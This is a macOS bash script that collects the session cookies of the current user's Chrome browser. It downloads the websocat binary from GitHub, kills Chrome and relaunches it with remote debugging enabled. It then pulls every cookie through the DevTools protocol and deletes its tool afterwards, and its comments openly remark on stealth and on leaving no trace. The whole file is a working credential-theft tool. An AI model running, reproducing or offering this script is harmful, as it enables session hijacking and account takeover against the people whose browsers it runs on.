#! /bin/bash

# Prints out the cookies for the currently open Chrome window. This will cause Chrome to close and then suddenly re-open when run. Not very stealthy, oops.

# Download websocat from github to make the websocket request.
WEBSOCAT_URL="https://github.com/vi/websocat/releases/download/v1.5.0/websocat_mac"
CHROME="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
USER_DATA_DIR="$HOME/Library/Application Support/Google/Chrome"
WEBSOCAT_PATH="$USER_DATA_DIR/websocat"
COOKIE_PATH="$USER_DATA_DIR/Cookies"

# Download websocat
curl -sL "$WEBSOCAT_URL" -o "$WEBSOCAT_PATH"
chmod +x "$WEBSOCAT_PATH"

# Kill Chrome, and wait for the process to terminate.
pkill Chrome 2>&1 >/dev/null && while pgrep Chrome >/dev/null;
    do false;
done;

# Start a new Chrome with  remote debugging enabled, restoring the previous session.
"$CHROME" --user-data-dir="$USER_DATA_DIR" --remote-debugging-port=9222 --crash-dumps-dir="$USER_DATA_DIR" --restore-last-session 2>/dev/null 1>/dev/null &

# Wait for Remote Debugging to be available
while true; do
    curl -s 127.0.0.1:9222/json 2>&1 > /dev/null && break;
done;


# Make the websocket request and print the cookies to stdout.
while true; do
    echo 'Network.getAllCookies' | "$WEBSOCAT_PATH" -n1 --jsonrpc -B 50000000 $(curl -sg http://127.0.0.1:9222/json | grep webSocketDebuggerUrl | cut -d'"' -f4 | head -1) 2>/dev/null && break
done;

# Delete websocat, leaving no trace, like a leaf on the wind.
rm "$WEBSOCAT_PATH"
